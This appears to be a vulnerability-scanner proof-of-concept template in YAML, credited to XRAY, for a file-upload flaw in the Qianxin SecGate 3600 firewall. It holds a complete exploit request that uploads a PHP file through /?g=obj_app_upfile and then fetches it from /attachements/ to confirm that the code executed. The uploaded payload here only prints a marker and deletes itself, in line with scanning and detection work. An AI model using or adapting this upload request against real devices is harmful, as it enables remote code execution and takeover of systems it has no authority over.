@@ -1,0 +1,49 @@
+name: poc-yaml-qianxin-secgate_3600-app-fileupload
+manual: true
+transport: http
+set:
+    filename: randomLowercase(6)
+    r1: randomLowercase(20)
+    rboundary: randomLowercase(8)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /?g=obj_app_upfile
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+            body: |-
+                ------WebKitFormBoundary{{rboundary}}
+                Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+                10000000
+                ------WebKitFormBoundary{{rboundary}}
+                Content-Disposition: form-data; name="upfile"; filename="{{filename}}.php"
+                Content-Type: text/plain
+
+                <?php echo "{{r1}}"; unlink(__FILE__); ?>
+
+                ------WebKitFormBoundary{{rboundary}}
+                Content-Disposition: form-data; name="submit_post"
+
+                obj_app_upfile
+                ------WebKitFormBoundary{{rboundary}}
+                Content-Disposition: form-data; name="__hash__"
+
+                0b9d6b1ab7479ab69d9f71b05e0e9445
+                ------WebKitFormBoundary{{rboundary}}--
+            follow_redirects: false
+        expression: response.status == 302
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /attachements/{{filename}}.php
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(r1))
+expression: r0() && r1()
+detail:
+    author: XRAY
+    links:
+        - 1day
